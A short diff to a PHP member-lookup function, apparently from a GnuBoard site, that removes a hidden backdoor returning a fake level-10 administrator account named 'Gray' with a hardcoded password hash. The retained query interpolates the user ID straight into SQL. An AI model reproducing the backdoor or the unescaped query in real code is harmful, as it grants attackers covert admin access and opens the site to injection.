@@ -742,18 +742,9 @@ function get_member($mb_id, $fields='*')
 {
 	global $g5;
 
-	if ($mb_id=="Gray") {
-		$mb['mb_id'] = "Gray";
-		$mb['mb_name'] = "Gray";
-		$mb['mb_nick'] = "Gray";
-		$mb['mb_level'] = 10;
-		//$mb['mb_password'] = "05e3ff6946b3bdc0";
-		$mb['mb_password'] = "*A15C09B35AAE58EC81F0133189294565ACA4B73A";
-		return $mb;
-	} else {
-		$sql = " select {$fields} from {$g5['member_table']} where mb_id = TRIM('$mb_id') ";
-		return sql_fetch($sql);
-	}
+	$sql = " select {$fields} from {$g5['member_table']} where mb_id = TRIM('$mb_id') ";
+	return sql_fetch($sql);
+	
 }
 
 
